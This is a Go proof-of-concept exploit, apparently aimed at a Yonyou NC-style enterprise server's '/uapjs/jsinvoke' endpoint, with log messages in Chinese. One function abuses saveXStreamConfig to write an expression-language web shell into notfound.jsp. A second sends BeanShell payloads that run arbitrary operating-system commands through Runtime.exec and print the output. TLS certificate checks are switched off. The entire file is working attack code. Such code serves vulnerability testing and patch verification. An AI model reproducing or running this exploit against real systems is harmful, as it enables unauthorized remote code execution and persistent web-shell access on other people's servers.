package poc

import (
	"bytes"
	"crypto/tls"
	"encoding/xml"
	"fmt"
	"io"
	"log"
	"net/http"
	"strings"
)

type XMLData struct {
	XMLName xml.Name `xml:"string"`
	Value   string   `xml:",innerxml"`
}

func UploadFile(target string) bool {
	url := strings.TrimRight(target, "/")
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}
	log.Println("[*] 准备写入文件")
	payload := "{\"serviceName\":\"nc.itf.iufo.IBaseSPService\",\"methodName\":\"saveXStreamConfig\",\"parameterTypes\":[\"java.lang.Object\",\"java.lang.String\"],\"parameters\":[\"${param.getClass().forName(param.error).newInstance().eval(param.cmd)}\",\"webapps/nc_web/notfound.jsp\"]}"
	request, err := http.NewRequest("POST", url+"/uapjs/jsinvoke/?action=invoke", bytes.NewBufferString(payload))
	if err != nil {
		log.Println("[-] Failed to create request:", err)
		return false
	}

	request.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	response, err := client.Do(request)
	if err != nil {
		log.Println("[-] Request failed:", err)
		return false
	}
	defer response.Body.Close()

	return response.StatusCode == http.StatusOK
}

func ExecuteCommand(url string, cmd string) {

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}
	payload := []byte("cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec(\"" + cmd + "\").getInputStream())")

	reqCmd, err := http.NewRequest("POST", url+"/notfound.jsp?error=bsh.Interpreter", bytes.NewBuffer(payload))
	if err != nil {
		log.Println("[-] Failed to create request:", err)
	}

	reqCmd.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	reqCmd.Header.Set("Content-Length", fmt.Sprintf("%d", len(payload)))

	respCmd, err := client.Do(reqCmd)
	if err != nil {
		log.Println("[-] Request failed:", err)
	}

	defer respCmd.Body.Close()

	if respCmd.StatusCode == http.StatusOK {
		log.Println("[*] 写入文件成功")
		cmdbody, err := io.ReadAll(respCmd.Body)
		if err != nil {
			log.Println("[-] Failed to read response:", err)
		}
		// 获取执行结果
		var data XMLData
		err = xml.Unmarshal([]byte(string(cmdbody)), &data)
		if err != nil {
			log.Println("[-] Error:", err)
		}
		log.Println("[+] cmd > ", data.Value)
	} else {
		log.Println("[-] 写入文件失败")
	}
}
